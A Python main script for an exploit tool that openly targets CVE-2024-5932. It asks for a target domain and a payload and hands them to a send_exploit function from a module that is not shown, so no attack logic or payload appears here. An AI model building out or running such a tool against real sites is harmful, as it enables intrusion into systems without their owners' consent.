import logging
from user_input import get_target_domain, get_payload
from exploit_logic import send_exploit


def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def main():
    setup_logging()
    logging.info("Starting CVE-2024-5932 exploit script")

    try:
        target_domain = get_target_domain()
        payload = get_payload()

        if target_domain and payload:
            send_exploit(target_domain, payload)
        else:
            logging.error("Failed to get valid target domain or payload. Exiting.")
    except KeyboardInterrupt:
        logging.info("Script execution interrupted by user.")
    except Exception as e:
        logging.exception(f"An unexpected error occurred: {str(e)}")
    finally:
        logging.info("Script execution completed.")


if __name__ == "__main__":
    main()